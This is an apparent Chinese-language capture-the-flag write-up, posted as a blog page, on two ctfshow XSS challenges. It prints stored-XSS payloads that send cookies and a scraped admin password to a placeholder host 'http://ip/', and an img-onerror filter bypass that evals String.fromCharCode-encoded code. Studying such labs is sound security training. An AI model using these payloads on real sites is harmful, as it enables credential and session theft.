@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ctfshow混合型XSS 注册个用户，有个签名的功能，管理员会审核，拿cookie 123&lt;script&gt;  fetch(&#x27;http:&#x2F;&#x2F;ip&#x2F;?cookie&#x3D;&#x27; + encodeURIComponent(document.cookie));&lt;&#x2F;script&gt;  拿不到估计是开了http only，防止读取cookie！题目提示：获取管理员密码  登录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="something-about-XSS-Challenges">
+<meta property="og:url" content="https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/index.html">
+<meta property="og:site_name" content="Rufeii">
+<meta property="og:description" content="ctfshow混合型XSS 注册个用户，有个签名的功能，管理员会审核，拿cookie 123&lt;script&gt;  fetch(&#x27;http:&#x2F;&#x2F;ip&#x2F;?cookie&#x3D;&#x27; + encodeURIComponent(document.cookie));&lt;&#x2F;script&gt;  拿不到估计是开了http only，防止读取cookie！题目提示：获取管理员密码  登录">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/12/image-20260104171728360.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/12/image-20260104172448180.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/12/image-20260104173307039.png">
+<meta property="article:published_time" content="2026-01-04T09:13:55.000Z">
+<meta property="article:modified_time" content="2026-01-04T09:43:23.851Z">
+<meta property="article:author" content="Rufeii">
+<meta property="article:tag" content="xss劫持密码">
+<meta property="article:tag" content="xss编码绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2025/12/image-20260104171728360.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/website.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>something-about-XSS-Challenges</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categ0ries</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/12/27/kali%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%8B%E8%BD%BDGitHack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&text=something-about-XSS-Challenges"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&is_video=false&description=something-about-XSS-Challenges"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=something-about-XSS-Challenges&body=Check out this article: https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&name=something-about-XSS-Challenges&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&t=something-about-XSS-Challenges"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E6%B7%B7%E5%90%88%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">ctfshow混合型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87XSS%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">ctfshow编码绕过XSS过滤</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        something-about-XSS-Challenges
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rufeii</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-04T09:13:55.000Z" class="dt-published" itemprop="datePublished">2026-01-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/xss/">xss</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/xss%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/" rel="tag">xss劫持密码</a>, <a class="p-category" href="/tags/xss%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" rel="tag">xss编码绕过</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="ctfshow混合型XSS"><a href="#ctfshow混合型XSS" class="headerlink" title="ctfshow混合型XSS"></a>ctfshow混合型XSS</h2><p><img src="/../images/achieve/2025/12/image-20260104171728360.png" alt="image-20260104171728360"></p>
+<p>注册个用户，有个签名的功能，管理员会审核，拿cookie</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  fetch(&#x27;http://ip/?cookie=&#x27; + encodeURIComponent(document.cookie));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>拿不到估计是开了<strong>http only</strong>，防止读取cookie！题目提示：获取管理员密码</p>
+<p><img src="/../images/achieve/2025/12/image-20260104172448180.png" alt="image-20260104172448180"></p>
+<p>登录之后账密全在网页源码里面，直接X就完了</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);</span><br><span class="line">xhr.onload = function() &#123;</span><br><span class="line">	var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];</span><br><span class="line">	fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/12/image-20260104173307039.png" alt="image-20260104173307039"></p>
+<p>base64解码之后就是flag</p>
+<h2 id="ctfshow编码绕过XSS过滤"><a href="#ctfshow编码绕过XSS过滤" class="headerlink" title="ctfshow编码绕过XSS过滤"></a>ctfshow编码绕过XSS过滤</h2><p>自己fuzz出来过滤了script和&#x2F;，那么首先是上一个payload的标签就不能用来（大小写没绕过），用img标签</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=xss onerror=alert(&#x27;ljf666&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在onerror写入我们的js代码，只不过&#x2F;这个没了，我们可以编码一下。参考：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1575647">XSS绕过技巧大全从空格编码到JS伪协议-开发者社区-阿里云</a></p>
+<p>这里写了个脚本转化成ascii</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_ascii</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="comment"># 使用 ord() 获取每个字符的 ASCII 值，并转为字符串</span></span><br><span class="line">    ascii_values = [<span class="built_in">str</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> text]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用逗号连接</span></span><br><span class="line">    result = <span class="string">&quot;,&quot;</span>.join(ascii_values)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互输入</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;请输入要转换的代码: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n转换后的 ASCII 序列为:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string_to_ascii(payload))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);xhr.onload = function()&#123;var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));&#125;;xhr.send();//这部分的ascii码填入payload就好了</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode())&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/categories/">categ0ries</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E6%B7%B7%E5%90%88%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">ctfshow混合型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87XSS%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">ctfshow编码绕过XSS过滤</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&text=something-about-XSS-Challenges"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&is_video=false&description=something-about-XSS-Challenges"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=something-about-XSS-Challenges&body=Check out this article: https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&title=something-about-XSS-Challenges"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&name=something-about-XSS-Challenges&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/01/04/something-about-XSS-Challenges/&t=something-about-XSS-Challenges"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Rufeii
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
+      </ul>
+      <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              
+            
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
